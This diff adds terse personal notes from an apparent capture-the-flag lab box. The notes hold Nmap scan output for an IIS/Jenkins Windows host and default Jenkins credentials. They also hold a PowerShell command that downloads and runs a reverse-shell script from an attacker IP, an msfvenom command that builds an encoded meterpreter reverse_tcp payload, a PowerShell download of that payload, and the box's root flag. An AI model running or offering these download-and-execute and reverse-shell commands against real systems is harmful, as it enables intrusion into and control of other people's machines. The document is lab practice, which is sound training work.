@@ -1,0 +1,60 @@
+ip address: 10.10.158.225
+
+Nmap results:
+
+PORT     STATE SERVICE            REASON  VERSION
+80/tcp   open  http               syn-ack Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  ssl/ms-wbt-server? syn-ack
+| ssl-cert: Subject: commonName=alfred
+| Issuer: commonName=alfred
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2021-11-10T15:35:47
+| Not valid after:  2022-05-12T15:35:47
+| MD5:   a853 da70 66cc 9cb1 0067 5ce3 c5c7 822d
+| SHA-1: 6674 2bba 5bf9 ec3d 2e9d d572 7b1c de2b f27f ebe3
+| -----BEGIN CERTIFICATE-----
+| MIIC0DCCAbigAwIBAgIQGCKdFbhEKptJy5FIFqOg/DANBgkqhkiG9w0BAQUFADAR
+| MQ8wDQYDVQQDEwZhbGZyZWQwHhcNMjExMTEwMTUzNTQ3WhcNMjIwNTEyMTUzNTQ3
+| WjARMQ8wDQYDVQQDEwZhbGZyZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+| AoIBAQCvQcjnYy54sPtKpqmaQu6HuR8fm4OTxOA07YIWgYe6lMZ+xiH1TT0yV2Eg
+| SvuFv6VTDe26Z27ADAHismBwG0GcT6kghuJ0rVgHlT+b3vlpSpgBhPaREoyMnPM5
+| nSeOCPqvpCcjlbTsN0Alsa2f4nrkHxLE3Kr6osw5d1JqgyH3q+cdOuhI10fu20pw
+| it+P7kmWw7dZnAn23JsqqaVNdROsI+35nXkX1RHjOtbmSmZV+TXtUGT3Yg5ASyjn
+| NdhpGdtzhTLGl62DGsvcqzVPq5w6faNFT1XyJMLOi155kotADe3LCrwYGhKdxhe0
+| XLCKzLg/ZLpPoGlZ2D1bKzKLzt3bAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUF
+| BwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUFAAOCAQEAgFm44jxbEwXweMHI
+| 55vWk2R/wC3zhdvJhO+SwzDtsR1S+5q0mdjiyTKCtdKMLFAj5JaI3p/NdoLgmTUj
+| erMO9/G2YsdKspiihOHtZaMfYNdCusdm6pAf/uBqnhxqyguk4trVQH2Cu3JRAZsd
+| 1mcpGxBQ1l23GH/C8wowI5Ygj0E+QrxleScfA76fbCIlna6W+feQyTiPefbiXg+H
+| xgIcQefeAJ6xNzxa+TnL7ag4yz5fwJTGEHNvZtJ+aLbIqmuHTjgn55oTXKfoxoet
+| XHm/eFmpB/leg19mJ3Y+QfAXtFdc0fsvKBp5kA8FCEbLbJUWLUAAmlZ9urbWSyTc
+| 9g2Wfg==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-11-11T15:39:09+00:00; +1s from scanner time.
+8080/tcp open  http               syn-ack Jetty 9.4.z-SNAPSHOT
+|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+jenkins username and password: admin/admin
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.3.246:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.3.246 -Port 9001
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=tun0 LPORT=9002 -f exe -o vanya.exe
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.3.246:8000/vanya.exe','vanya.exe')"
+
+
+root flag: dff0f748678f280250f25a45b8046b4a
